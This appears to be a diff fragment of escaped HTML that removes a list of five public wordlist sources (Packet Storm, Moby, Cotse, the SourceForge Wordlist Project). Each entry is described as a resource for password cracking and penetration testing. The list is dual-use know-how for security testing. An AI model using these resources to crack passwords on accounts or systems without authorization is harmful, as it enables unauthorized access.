-&lt;p&gt;&lt;strong&gt;Packet Storm Wordlists&lt;/strong&gt;&lt;br&gt;
-Use: A trusted resource offering various wordlists for security professionals, particularly for cracking passwords.
-&lt;a href=&#34;http://packetstormsecurity.org/Crackers/wordlists/&#34;&gt;http://packetstormsecurity.org/Crackers/wordlists/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Moby Wordlists&lt;/strong&gt;&lt;br&gt;
-Use: Large collections of English wordlists used in password cracking and natural language processing tasks.
-&lt;a href=&#34;http://www.ai.uga.edu/ftplib/natural-language/moby/&#34;&gt;http://www.ai.uga.edu/ftplib/natural-language/moby/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Cotse Wordlists 1&lt;/strong&gt;&lt;br&gt;
-Use: Provides wordlists for security testing, including common passwords and user names.
-&lt;a href=&#34;http://www.cotse.com/tools/wordlists1.htm&#34;&gt;http://www.cotse.com/tools/wordlists1.htm&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Cotse Wordlists 2&lt;/strong&gt;&lt;br&gt;
-Use: Additional wordlists for password cracking and penetration testing.
-&lt;a href=&#34;http://www.cotse.com/tools/wordlists2.htm&#34;&gt;http://www.cotse.com/tools/wordlists2.htm&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Wordlist Project&lt;/strong&gt;&lt;br&gt;
-Use: A SourceForge project offering a variety of wordlists for password cracking and security testing.
-&lt;a href=&#34;http://wordlist.sourceforge.net/&#34;&gt;http://wordlist.sourceforge.net/&lt;/a&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;p&gt;[Crusveder]&lt;/p&gt;
 </content>
